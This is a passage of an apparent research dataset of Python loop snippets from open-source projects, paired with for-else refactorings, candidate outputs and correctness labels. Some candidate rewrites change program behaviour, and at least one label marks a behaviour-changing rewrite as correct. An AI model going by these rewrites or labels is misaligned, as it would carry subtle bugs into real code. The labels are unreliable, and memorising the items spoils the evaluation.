        # Path to be aware of and not overwrite/remove/etc.
        staging_path = os.path.join(self._updater_path, ""update_staging"")

        # If clean install is enabled, clear existing files ahead of time
        # note: will not delete the update.json, update folder, staging, or
        # staging but will delete all other folders/files in addon directory.
        error = None
        if clean:
            try:
                # Implement clearing of all folders/files, except the updater
                # folder and updater json.
                # Careful, this deletes entire subdirectories recursively...
                # Make sure that base is not a high level shared folder, but
                # is dedicated just to the addon itself.
                self.print_verbose(
                    ""clean=True, clearing addon folder to fresh install state"")

                # Remove root files and folders (except update folder).
                files = [f for f in os.listdir(base)
                         if os.path.isfile(os.path.join(base, f))]
                folders = [f for f in os.listdir(base)
                           if os.path.isdir(os.path.join(base, f))]

                for f in files:
                    os.remove(os.path.join(base, f))
                    self.print_verbose(
                        ""Clean removing file {}"".format(os.path.join(base, f)))
                for f in folders:
                    if os.path.join(base, f) is self._updater_path:
                        continue
                    shutil.rmtree(os.path.join(base, f))
                    self.print_verbose(
                        ""Clean removing folder and contents {}"".format(
                            os.path.join(base, f)))

            except Exception as err:
                error = ""failed to create clean existing addon folder""
                print(error, str(err))
                self.print_trace()

        # Walk through the base addon folder for rules on pre-removing
        # but avoid removing/altering backup and updater file.
        for path, dirs, files in os.walk(base):
            # Prune ie skip updater folder.
            dirs[:] = [d for d in dirs
                       if os.path.join(path, d) not in [self._updater_path]]
            for file in files:
                for pattern in self.remove_pre_update_patterns:
                    if fnmatch.filter([file], pattern):
                        try:
                            fl = os.path.join(path, file)
                            os.remove(fl)
                            self.print_verbose(""Pre-removed file "" + file)
                        except OSError:
                            print(""Failed to pre-remove "" + file)
                            self.print_trace()

        # Walk through the temp addon sub folder for replacements
        # this implements the overwrite rules, which apply after
        # the above pre-removal rules. This also performs the
        # actual file copying/replacements.
        for path, dirs, files in os.walk(merger):
            # Verify structure works to prune updater sub folder overwriting.
            dirs[:] = [d for d in dirs
                       if os.path.join(path, d) not in [self._updater_path]]
            rel_path = os.path.relpath(path, merger)
            dest_path = os.path.join(base, rel_path)
            if not os.path.exists(dest_path):
                os.makedirs(dest_path)
            for file in files:
                # Bring in additional logic around copying/replacing.
                # Blender default: overwrite .py's, don't overwrite the rest.
                dest_file = os.path.join(dest_path, file)
                srcFile = os.path.join(path, file)

                # Decide to replace if file already exists, and copy new over.
                if os.path.isfile(dest_file):
                    # Otherwise, check each file for overwrite pattern match.
                    replaced = False
                    for pattern in self._overwrite_patterns:
                        if fnmatch.filter([file], pattern):
                            replaced = True
                            break
                    if replaced:
                        os.remove(dest_file)
                        os.rename(srcFile, dest_file)
                        self.print_verbose(
                            ""Overwrote file "" + os.path.basename(dest_file))
                    else:
                        self.print_verbose(
                            ""Pattern not matched to {}, not overwritten"".format(
                                os.path.basename(dest_file)))
                else:
                    # File did not previously exist, simply move it over.
                    os.rename(srcFile, dest_file)
                    self.print_verbose(
                        ""New file "" + os.path.basename(dest_file))

        # now remove the temp staging folder and downloaded zip
        try:
            shutil.rmtree(staging_path)
        except:
            error = (""Error: Failed to remove existing staging directory, ""
                     ""consider manually removing "") + staging_path
            self.print_verbose(error)
            self.print_trace()","for pattern in self._overwrite_patterns:
    if fnmatch.filter([file], pattern):
        replaced = True
        break
if replaced:
    os.remove(dest_file)
    os.rename(srcFile, dest_file)
    self.print_verbose('Overwrote file ' + os.path.basename(dest_file))
else:
    self.print_verbose('Pattern not matched to {}, not overwritten'.format(os.path.basename(dest_file)))","for pattern in self._overwrite_patterns:
    if fnmatch.filter([file], pattern):
        os.remove(dest_file)
        os.rename(srcFile, dest_file)
        self.print_verbose('Overwrote file ' + os.path.basename(dest_file))
        break
else:
    self.print_verbose('Pattern not matched to {}, not overwritten'.format(os.path.basename(dest_file)))","for pattern in self._overwrite_patterns:
    if fnmatch.filter([file], pattern):
        os.remove(dest_file)
        os.rename(srcFile, dest_file)
        self.print_verbose('Overwrote file ' + os.path.basename(dest_file))
        break
else:
    self.print_verbose('Pattern not matched to {}, not overwritten'.format(os.path.basename(dest_file)))",1,"for pattern in self._overwrite_patterns:
    if fnmatch.filter([file], pattern):
        replaced = True
        break
if replaced:
    os.remove(dest_file)
    os.rename(srcFile, dest_file)
    self.print_verbose('Overwrote file ' + os.path.basename(dest_file))
else:
    self.print_verbose('Pattern not matched to {}, not overwritten'.format(os.path.basename(dest_file)))","break statement is executed:zejun1
break statement is not executed:None"
OpenWPM,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/OpenWPM/openwpm/browser_manager.py,https://github.com/openwpm/OpenWPM/tree/master/openwpm/browser_manager.py,BrowserManager,_start_extension$657,"def _start_extension(self, browser_profile_path: Path) -> ClientSocket:
        """"""Start up the extension
        Blocks until the extension has fully started up
        """"""
        assert self.browser_params.browser_id is not None
        self.logger.debug(
            ""BROWSER %i: Looking for extension port information ""
            ""in %s"" % (self.browser_params.browser_id, browser_profile_path)
        )
        elapsed = 0.0
        port = None
        ep_filename = browser_profile_path / ""extension_port.txt""
        while elapsed < 5:
            try:
                with open(ep_filename, ""rt"") as f:
                    port = int(f.read().strip())
                    break
            except IOError as e:
                if e.errno != errno.ENOENT:
                    raise
            time.sleep(0.1)
            elapsed += 0.1
        if port is None:
            # try one last time, allowing all exceptions to propagate
            with open(ep_filename, ""rt"") as f:
                port = int(f.read().strip())

        ep_filename.unlink()
        self.logger.debug(
            ""BROWSER %i: Connecting to extension on port %i""
            % (self.browser_params.browser_id, port)
        )
        extension_socket = ClientSocket(serialization=""json"")
        extension_socket.connect(""127.0.0.1"", int(port))

        success_filename = browser_profile_path / ""OPENWPM_STARTUP_SUCCESS.txt""
        startup_successful = False
        while elapsed < 10:
            if success_filename.exists():
                startup_successful = True
                break
            time.sleep(0.1)
            elapsed += 0.1

        if not startup_successful:
            self.logger.error(
                ""BROWSER %i: Failed to complete extension startup in time"",
                self.browser_params.browser_id,
            )
            raise BrowserConfigError(""The extension did not boot up in time"")
        success_filename.unlink()
        return extension_socket","while elapsed < 5:
    try:
        with open(ep_filename, 'rt') as f:
            port = int(f.read().strip())
            break
    except IOError as e:
        if e.errno != errno.ENOENT:
            raise
    time.sleep(0.1)
    elapsed += 0.1
if port is None:
    with open(ep_filename, 'rt') as f:
        port = int(f.read().strip())","while elapsed < 5:
    try:
        with open(ep_filename, 'rt') as f:
            port = int(f.read().strip())
            break
    except IOError as e:
        if e.errno != errno.ENOENT:
            raise
    time.sleep(0.1)
    elapsed += 0.1
else:
    with open(ep_filename, 'rt') as f:
        port = int(f.read().strip())",Cannot refactor,-1,"while elapsed < 5:
    try:
        with open(ep_filename, 'rt') as f:
            port = int(f.read().strip())
            break
    except IOError as e:
        if e.errno != errno.ENOENT:
            raise
    time.sleep(0.1)
    elapsed += 0.1
if port is None:
    with open(ep_filename, 'rt') as f:
        port = int(f.read().strip())","break statement is executed:None
break statement is not executed:zejun1"
kube-janitor,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/kube-janitor/kube_janitor/resource_context.py,https://github.com/hjacobs/kube-janitor/tree/master/kube_janitor/resource_context.py,,get_persistent_volume_claim_context$53,"def get_persistent_volume_claim_context(
    pvc: NamespacedAPIObject, cache: Dict[str, Any]
) -> Dict[str, Any]:
    """"""Get context for PersistentVolumeClaim: whether it's mounted by a Pod and whether it's referenced by a StatefulSet.""""""
    pvc_is_mounted = False
    pvc_is_referenced = False

    for clazz, claim_path in PVC_REFERENCES.items():
        if pvc_is_referenced:
            break
        # find out whether the PVC is still mounted by a Pod or referenced by some object
        for obj in get_objects_in_namespace(clazz, pvc.api, pvc.namespace, cache):
            if is_pvc_referenced_by_object(pvc, obj, claim_path):
                if clazz is Pod:
                    verb = ""mounted""
                    pvc_is_mounted = True
                else:
                    verb = ""referenced""
                logger.debug(
                    f""{pvc.kind} {pvc.namespace}/{pvc.name} is {verb} by {obj.kind} {obj.name}""
                )
                pvc_is_referenced = True
                break

    if not pvc_is_referenced:
        # find out whether the PVC is still referenced by a StatefulSet
        for sts in get_objects_in_namespace(StatefulSet, pvc.api, pvc.namespace, cache):
            # see https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/
            for claim_template in sts.obj.get(""spec"", {}).get(
                ""volumeClaimTemplates"", []
            ):
                claim_prefix = claim_template.get(""metadata"", {}).get(""name"")
                claim_name_pattern = re.compile(f""^{claim_prefix}-{sts.name}-[0-9]+$"")
                if claim_name_pattern.match(pvc.name):
                    logger.debug(
                        f""{pvc.kind} {pvc.namespace}/{pvc.name} is referenced by {sts.kind} {sts.name}""
                    )
                    pvc_is_referenced = True
                    break

    # negate the property to make it less error-prone for JMESpath usage
    return {
        ""pvc_is_not_mounted"": not pvc_is_mounted,
        ""pvc_is_not_referenced"": not pvc_is_referenced,
    }","for (clazz, claim_path) in PVC_REFERENCES.items():
    if pvc_is_referenced:
        break
    for obj in get_objects_in_namespace(clazz, pvc.api, pvc.namespace, cache):
        if is_pvc_referenced_by_object(pvc, obj, claim_path):
            if clazz is Pod:
                verb = 'mounted'
                pvc_is_mounted = True
            else:
                verb = 'referenced'
            logger.debug(f'{pvc.kind} {pvc.namespace}/{pvc.name} is {verb} by {obj.kind} {obj.name}')
            pvc_is_referenced = True
            break
if not pvc_is_referenced:
    for sts in get_objects_in_namespace(StatefulSet, pvc.api, pvc.namespace, cache):
        for claim_template in sts.obj.get('spec', {}).get('volumeClaimTemplates', []):
            claim_prefix = claim_template.get('metadata', {}).get('name')
            claim_name_pattern = re.compile(f'^{claim_prefix}-{sts.name}-[0-9]+$')
            if claim_name_pattern.match(pvc.name):
                logger.debug(f'{pvc.kind} {pvc.namespace}/{pvc.name} is referenced by {sts.kind} {sts.name}')
                pvc_is_referenced = True
                break","for (clazz, claim_path) in PVC_REFERENCES.items():
    if pvc_is_referenced:
        break
    for obj in get_objects_in_namespace(clazz, pvc.api, pvc.namespace, cache):
        if is_pvc_referenced_by_object(pvc, obj, claim_path):
            if clazz is Pod:
                verb = 'mounted'
                pvc_is_mounted = True
            else:
                verb = 'referenced'
            logger.debug(f'{pvc.kind} {pvc.namespace}/{pvc.name} is {verb} by {obj.kind} {obj.name}')
            pvc_is_referenced = True
            break
else:
    for sts in get_objects_in_namespace(StatefulSet, pvc.api, pvc.namespace, cache):
        for claim_template in sts.obj.get('spec', {}).get('volumeClaimTemplates', []):
            claim_prefix = claim_template.get('metadata', {}).get('name')
            claim_name_pattern = re.compile(f'^{claim_prefix}-{sts.name}-[0-9]+$')
            if claim_name_pattern.match(pvc.name):
                logger.debug(f'{pvc.kind} {pvc.namespace}/{pvc.name} is referenced by {sts.kind} {sts.name}')
                pvc_is_referenced = True
                break","for (clazz, claim_path) in PVC_REFERENCES.items():
    if pvc_is_referenced:
        break
    for obj in get_objects_in_namespace(clazz, pvc.api, pvc.namespace, cache):
        if is_pvc_referenced_by_object(pvc, obj, claim_path):
            if clazz is Pod:
                verb = 'mounted'
                pvc_is_mounted = True
            else:
                verb = 'referenced'
            logger.debug(f'{pvc.kind} {pvc.namespace}/{pvc.name} is {verb} by {obj.kind} {obj.name}')
            pvc_is_referenced = True
            break
else:
    for sts in get_objects_in_namespace(StatefulSet, pvc.api, pvc.namespace, cache):
        for claim_template in sts.obj.get('spec', {}).get('volumeClaimTemplates', []):
            claim_prefix = claim_template.get('metadata', {}).get('name')
            claim_name_pattern = re.compile(f'^{claim_prefix}-{sts.name}-[0-9]+$')
            if claim_name_pattern.match(pvc.name):
                logger.debug(f'{pvc.kind} {pvc.namespace}/{pvc.name} is referenced by {sts.kind} {sts.name}')
                pvc_is_referenced = True
                break",1,"for (clazz, claim_path) in PVC_REFERENCES.items():
    if pvc_is_referenced:
        break
    for obj in get_objects_in_namespace(clazz, pvc.api, pvc.namespace, cache):
        if is_pvc_referenced_by_object(pvc, obj, claim_path):
            if clazz is Pod:
                verb = 'mounted'
                pvc_is_mounted = True
            else:
                verb = 'referenced'
            logger.debug(f'{pvc.kind} {pvc.namespace}/{pvc.name} is {verb} by {obj.kind} {obj.name}')
            pvc_is_referenced = True
            break
if not pvc_is_referenced:
    for sts in get_objects_in_namespace(StatefulSet, pvc.api, pvc.namespace, cache):
        for claim_template in sts.obj.get('spec', {}).get('volumeClaimTemplates', []):
            claim_prefix = claim_template.get('metadata', {}).get('name')
            claim_name_pattern = re.compile(f'^{claim_prefix}-{sts.name}-[0-9]+$')
            if claim_name_pattern.match(pvc.name):
                logger.debug(f'{pvc.kind} {pvc.namespace}/{pvc.name} is referenced by {sts.kind} {sts.name}')
                pvc_is_referenced = True
                break","break statement is executed:None
break statement is not executed:zejun1"
TauonMusicBox,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/TauonMusicBox/t_modules/t_main.py,https://github.com/Taiko2k/TauonMusicBox/tree/master/t_modules/t_main.py,,get_lyric_fire$15350,"def get_lyric_fire(track_object, silent=False):
    lyrics_ren.lyrics_position = 0

    if not prefs.lyrics_enables:
        if not silent:
            show_message(_(""There are no lyric sources enabled.""),
                         ""See 'lyrics settings' under 'functions' tab in settings."", mode='info')
        return

    t = lyrics_fetch_timer.get()
    print(""Lyric rate limit timer is: "" + str(t) + "" / -60"")
    if t < -40:
        print(""Lets try again later"")
        if not silent:
            show_message(_(""Let's be polite and try later.""))

            if t < -65:
                show_message(""Stop requesting lyrics AAAAAA."", mode='error')

        # If the user keeps pressing, lets mess with them haha
        lyrics_fetch_timer.force_set(t - 5)

        return 'later'

    if t > 0:
        lyrics_fetch_timer.set()
        t = 0

    lyrics_fetch_timer.force_set(t - 10)

    if not silent:
        show_message(_(""Searching...""))

    s_artist = track_object.artist
    s_title = track_object.title

    if s_artist in prefs.lyrics_subs:
        s_artist = prefs.lyrics_subs[s_artist]
    if s_title in prefs.lyrics_subs:
        s_title = prefs.lyrics_subs[s_title]

    console.print(f""Searching for lyrics: {s_artist} - {s_title}"", level=1)

    found = False
    for name in prefs.lyrics_enables:

        if name in lyric_sources.keys():
            func = lyric_sources[name]

            try:
                lyrics = func(s_artist, s_title)
                if lyrics:
                    console.print(f""Found lyrics from {name}"", level=1)
                    track_object.lyrics = lyrics
                    found = True
                    break
            except Exception as e:
                console.print(str(e))

            if not found:
                console.print(f""Could not find lyrics from source {name}"", level=1)

    if not found:
        if not silent:
            show_message(_(""No lyrics for this track were found""))
    else:
        gui.message_box = False
        if not gui.showcase_mode:
            prefs.show_lyrics_side = True
        gui.update += 1
        lyrics_ren.lyrics_position = 0
        pctl.notify_change()","for name in prefs.lyrics_enables:
    if name in lyric_sources.keys():
        func = lyric_sources[name]
        try:
            lyrics = func(s_artist, s_title)
            if lyrics:
                console.print(f'Found lyrics from {name}', level=1)
                track_object.lyrics = lyrics
                found = True
                break
        except Exception as e:
            console.print(str(e))
        if not found:
            console.print(f'Could not find lyrics from source {name}', level=1)
if not found:
    if not silent:
        show_message(_('No lyrics for this track were found'))
else:
    gui.message_box = False
    if not gui.showcase_mode:
        prefs.show_lyrics_side = True
    gui.update += 1
    lyrics_ren.lyrics_position = 0
    pctl.notify_change()","for name in prefs.lyrics_enables:
    if name in lyric_sources.keys():
        func = lyric_sources[name]
        try:
            lyrics = func(s_artist, s_title)
            if lyrics:
                console.print(f'Found lyrics from {name}', level=1)
                track_object.lyrics = lyrics
                gui.message_box = False
                if not gui.showcase_mode:
                    prefs.show_lyrics_side = True
                gui.update += 1
                lyrics_ren.lyrics_position = 0
                pctl.notify_change()
                break
        except Exception as e:
            console.print(str(e))
        if not found:
            console.print(f'Could not find lyrics from source {name}', level=1)
else:
    if not silent:
        show_message(_('No lyrics for this track were found'))","for name in prefs.lyrics_enables:
    if name in lyric_sources.keys():
        func = lyric_sources[name]
        try:
            lyrics = func(s_artist, s_title)
            if lyrics:
                console.print(f'Found lyrics from {name}', level=1)
                track_object.lyrics = lyrics
                found = True
                gui.message_box = False
                if not gui.showcase_mode:
                    prefs.show_lyrics_side = True
                gui.update += 1
                lyrics_ren.lyrics_position = 0
                pctl.notify_change()
                break
        except Exception as e:
            console.print(str(e))
        if not found:
            console.print(f'Could not find lyrics from source {name}', level=1)
else:
    if not silent:
        show_message(_('No lyrics for this track were found'))",0,"for name in prefs.lyrics_enables:
    if name in lyric_sources.keys():
        func = lyric_sources[name]
        try:
            lyrics = func(s_artist, s_title)
            if lyrics:
                console.print(f'Found lyrics from {name}', level=1)
                track_object.lyrics = lyrics
                found = True
                break
        except Exception as e:
            console.print(str(e))
        if not found:
            console.print(f'Could not find lyrics from source {name}', level=1)
if not found:
    if not silent:
        show_message(_('No lyrics for this track were found'))
else:
    gui.message_box = False
    if not gui.showcase_mode:
        prefs.show_lyrics_side = True
    gui.update += 1
    lyrics_ren.lyrics_position = 0
    pctl.notify_change()","break statement is executed:None
break statement is not executed:zejun1"
Mycodo,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Mycodo/mycodo/inputs/sht3x.py,https://github.com/kizniche/Mycodo/tree/master/mycodo/inputs/sht3x.py,InputModule,get_measurement$119,"def get_measurement(self):
        if not self.sensor:
            self.logger.error(""Error 101: Device not set up. See https://kizniche.github.io/Mycodo/Error-Codes#error-101 for more info."")
            return

        self.return_dict = copy.deepcopy(measurements_dict)

        temperature = None
        humidity = None
        success = False
        for _ in range(3):  # Three attempts
            try:
                temperature, humidity = self.sensor.read_temperature_humidity()
            except OSError as e:
                self.logger.debug(""OSError: {}"".format(e))
                self.logger.debug(""Attempting reset of sensor and another measurement"")
                try:
                    self.sensor.reset()
                    try:
                        temperature, humidity = self.sensor.read_temperature_humidity()
                    except Exception as e:
                        self.logger.debug(""Measurement unsuccessful after reset"")
                except Exception:
                    self.logger.debug(""Reset command unsuccessful"")
            if None in [temperature, humidity] or math.isnan(temperature) or math.isnan(humidity):
                self.logger.debug(""One not a number: Temperature: {}, Humidity: {}"".format(temperature, humidity))
            else:
                success = True
                break
            time.sleep(0.1)

        if not success:
            self.logger.debug(""Could not obtain measurements after 3 tries"")
            return

        if self.is_enabled(0):
            self.value_set(0, temperature)

        if self.is_enabled(1):
            self.value_set(1, humidity)

        if self.is_enabled(2) and self.is_enabled(0) and self.is_enabled(1):
            self.value_set(2, calculate_dewpoint(self.value_get(0), self.value_get(1)))

        if self.is_enabled(3) and self.is_enabled(0) and self.is_enabled(1):
            self.value_set(3, calculate_vapor_pressure_deficit(self.value_get(0), self.value_get(1)))

        if self.heater_enable and self.heater_seconds and self.heater_measurements:
            time.sleep(2)
            self.measurement_count += 1
            if self.measurement_count >= self.heater_measurements:
                self.measurement_count = 0
                self.sensor.set_heater(True)
                time.sleep(self.heater_seconds)
                self.sensor.set_heater(False)

        return self.return_dict","for _ in range(3):
    try:
        (temperature, humidity) = self.sensor.read_temperature_humidity()
    except OSError as e:
        self.logger.debug('OSError: {}'.format(e))
        self.logger.debug('Attempting reset of sensor and another measurement')
        try:
            self.sensor.reset()
            try:
                (temperature, humidity) = self.sensor.read_temperature_humidity()
            except Exception as e:
                self.logger.debug('Measurement unsuccessful after reset')
        except Exception:
            self.logger.debug('Reset command unsuccessful')
    if None in [temperature, humidity] or math.isnan(temperature) or math.isnan(humidity):
        self.logger.debug('One not a number: Temperature: {}, Humidity: {}'.format(temperature, humidity))
    else:
        success = True
        break
    time.sleep(0.1)
if not success:
    self.logger.debug('Could not obtain measurements after 3 tries')
    return","for _ in range(3):
    try:
        (temperature, humidity) = self.sensor.read_temperature_humidity()
    except OSError as e:
        self.logger.debug('OSError: {}'.format(e))
        self.logger.debug('Attempting reset of sensor and another measurement')
        try:
            self.sensor.reset()
            try:
                (temperature, humidity) = self.sensor.read_temperature_humidity()
            except Exception as e:
                self.logger.debug('Measurement unsuccessful after reset')
        except Exception:
            self.logger.debug('Reset command unsuccessful')
    if None in [temperature, humidity] or math.isnan(temperature) or math.isnan(humidity):
        self.logger.debug('One not a number: Temperature: {}, Humidity: {}'.format(temperature, humidity))
    else:
        break
    time.sleep(0.1)
else:
    self.logger.debug('Could not obtain measurements after 3 tries')
    return","for _ in range(3):
    try:
        (temperature, humidity) = self.sensor.read_temperature_humidity()
    except OSError as e:
        self.logger.debug('OSError: {}'.format(e))
        self.logger.debug('Attempting reset of sensor and another measurement')
        try:
            self.sensor.reset()
            try:
                (temperature, humidity) = self.sensor.read_temperature_humidity()
            except Exception as e:
                self.logger.debug('Measurement unsuccessful after reset')
        except Exception:
            self.logger.debug('Reset command unsuccessful')
    if None in [temperature, humidity] or math.isnan(temperature) or math.isnan(humidity):
        self.logger.debug('One not a number: Temperature: {}, Humidity: {}'.format(temperature, humidity))
    else:
        break
    time.sleep(0.1)
else:
    self.logger.debug('Could not obtain measurements after 3 tries')
    return",1,"for _ in range(3):
    try:
        (temperature, humidity) = self.sensor.read_temperature_humidity()
    except OSError as e:
        self.logger.debug('OSError: {}'.format(e))
        self.logger.debug('Attempting reset of sensor and another measurement')
        try:
            self.sensor.reset()
            try:
                (temperature, humidity) = self.sensor.read_temperature_humidity()
            except Exception as e:
                self.logger.debug('Measurement unsuccessful after reset')
        except Exception:
            self.logger.debug('Reset command unsuccessful')
    if None in [temperature, humidity] or math.isnan(temperature) or math.isnan(humidity):
        self.logger.debug('One not a number: Temperature: {}, Humidity: {}'.format(temperature, humidity))
    else:
        success = True
        break
    time.sleep(0.1)
if not success:
    self.logger.debug('Could not obtain measurements after 3 tries')
    return","break statement is executed:None
break statement is not executed:zejun1"
pyquil,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pyquil/pyquil/experiment/_group.py,https://github.com/rigetti/pyquil/tree/master/pyquil/experiment/_group.py,,_max_tpb_overlap$217,"def _max_tpb_overlap(
    tomo_expt: Experiment,
) -> Dict[ExperimentSetting, List[ExperimentSetting]]:
    """"""
    Given an input Experiment, provide a dictionary indicating which ExperimentSettings
    share a tensor product basis

    :param tomo_expt: Experiment, from which to group ExperimentSettings that share a tpb
        and can be run together
    :return: dictionary keyed with ExperimentSetting (specifying a tpb), and with each value being a
            list of ExperimentSettings (diagonal in that tpb)
    """"""
    # initialize empty dictionary
    diagonal_sets: Dict[ExperimentSetting, List[ExperimentSetting]] = {}
    # loop through ExperimentSettings of the Experiment
    for expt_setting in tomo_expt:
        # no need to group already grouped Experiment
        assert len(expt_setting) == 1, ""already grouped?""
        unpacked_expt_setting = expt_setting[0]
        # calculate max overlap of expt_setting with keys of diagonal_sets
        # keep track of whether a shared tpb was found
        found_tpb = False
        # loop through dict items
        for es, es_list in diagonal_sets.items():
            trial_es_list = es_list + [unpacked_expt_setting]
            diag_in_term = _max_weight_state(expst.in_state for expst in trial_es_list)
            diag_out_term = _max_weight_operator(expst.out_operator for expst in trial_es_list)
            # max_weight_xxx returns None if the set of xxx's don't share a TPB, so the following
            # conditional is True if expt_setting can be inserted into the current es_list.
            if diag_in_term is not None and diag_out_term is not None:
                found_tpb = True
                assert len(diag_in_term) >= len(
                    es.in_state
                ), ""Highest weight in-state can't be smaller than the given in-state""
                assert len(diag_out_term) >= len(
                    es.out_operator
                ), ""Highest weight out-PauliTerm can't be smaller than the given out-PauliTerm""

                # update the diagonalizing basis (key of dict) if necessary
                if len(diag_in_term) > len(es.in_state) or len(diag_out_term) > len(es.out_operator):
                    del diagonal_sets[es]
                    new_es = ExperimentSetting(diag_in_term, diag_out_term)
                    diagonal_sets[new_es] = trial_es_list
                else:
                    diagonal_sets[es] = trial_es_list
                break

        if not found_tpb:
            # made it through entire dict without finding any ExperimentSetting with shared tpb,
            # so need to make a new item
            diagonal_sets[unpacked_expt_setting] = [unpacked_expt_setting]

    return diagonal_sets","for (es, es_list) in diagonal_sets.items():
    trial_es_list = es_list + [unpacked_expt_setting]
    diag_in_term = _max_weight_state((expst.in_state for expst in trial_es_list))
    diag_out_term = _max_weight_operator((expst.out_operator for expst in trial_es_list))
    if diag_in_term is not None and diag_out_term is not None:
        found_tpb = True
        assert len(diag_in_term) >= len(es.in_state), ""Highest weight in-state can't be smaller than the given in-state""
        assert len(diag_out_term) >= len(es.out_operator), ""Highest weight out-PauliTerm can't be smaller than the given out-PauliTerm""
        if len(diag_in_term) > len(es.in_state) or len(diag_out_term) > len(es.out_operator):
            del diagonal_sets[es]
            new_es = ExperimentSetting(diag_in_term, diag_out_term)
            diagonal_sets[new_es] = trial_es_list
        else:
            diagonal_sets[es] = trial_es_list
        break
if not found_tpb:
    diagonal_sets[unpacked_expt_setting] = [unpacked_expt_setting]","for (es, es_list) in diagonal_sets.items():
    trial_es_list = es_list + [unpacked_expt_setting]
    diag_in_term = _max_weight_state((expst.in_state for expst in trial_es_list))
    diag_out_term = _max_weight_operator((expst.out_operator for expst in trial_es_list))
    if diag_in_term is not None and diag_out_term is not None:
        assert len(diag_in_term) >= len(es.in_state), ""Highest weight in-state can't be smaller than the given in-state""
        assert len(diag_out_term) >= len(es.out_operator), ""Highest weight out-PauliTerm can't be smaller than the given out-PauliTerm""
        if len(diag_in_term) > len(es.in_state) or len(diag_out_term) > len(es.out_operator):
            del diagonal_sets[es]
            new_es = ExperimentSetting(diag_in_term, diag_out_term)
            diagonal_sets[new_es] = trial_es_list
        else:
            diagonal_sets[es] = trial_es_list
        break
else:
    diagonal_sets[unpacked_expt_setting] = [unpacked_expt_setting]","for (es, es_list) in diagonal_sets.items():
    trial_es_list = es_list + [unpacked_expt_setting]
    diag_in_term = _max_weight_state((expst.in_state for expst in trial_es_list))
    diag_out_term = _max_weight_operator((expst.out_operator for expst in trial_es_list))
    if diag_in_term is not None and diag_out_term is not None:
        assert len(diag_in_term) >= len(es.in_state), ""Highest weight in-state can't be smaller than the given in-state""
        assert len(diag_out_term) >= len(es.out_operator), ""Highest weight out-PauliTerm can't be smaller than the given out-PauliTerm""
        if len(diag_in_term) > len(es.in_state) or len(diag_out_term) > len(es.out_operator):
            del diagonal_sets[es]
            new_es = ExperimentSetting(diag_in_term, diag_out_term)
            diagonal_sets[new_es] = trial_es_list
        else:
            diagonal_sets[es] = trial_es_list
        break
else:
    diagonal_sets[unpacked_expt_setting] = [unpacked_expt_setting]",1,"for (es, es_list) in diagonal_sets.items():
    trial_es_list = es_list + [unpacked_expt_setting]
    diag_in_term = _max_weight_state((expst.in_state for expst in trial_es_list))
    diag_out_term = _max_weight_operator((expst.out_operator for expst in trial_es_list))
    if diag_in_term is not None and diag_out_term is not None:
        found_tpb = True
        assert len(diag_in_term) >= len(es.in_state), ""Highest weight in-state can't be smaller than the given in-state""
        assert len(diag_out_term) >= len(es.out_operator), ""Highest weight out-PauliTerm can't be smaller than the given out-PauliTerm""
        if len(diag_in_term) > len(es.in_state) or len(diag_out_term) > len(es.out_operator):
            del diagonal_sets[es]
            new_es = ExperimentSetting(diag_in_term, diag_out_term)
            diagonal_sets[new_es] = trial_es_list
        else:
            diagonal_sets[es] = trial_es_list
        break
if not found_tpb:
    diagonal_sets[unpacked_expt_setting] = [unpacked_expt_setting]","break statement is executed:None
break statement is not executed:zejun1"
adapter-transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/adapter-transformers/src/transformers/models/mobilebert/tokenization_mobilebert.py,https://github.com/Adapter-Hub/adapter-transformers/tree/master/src/transformers/models/mobilebert/tokenization_mobilebert.py,WordpieceTokenizer,tokenize$458,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
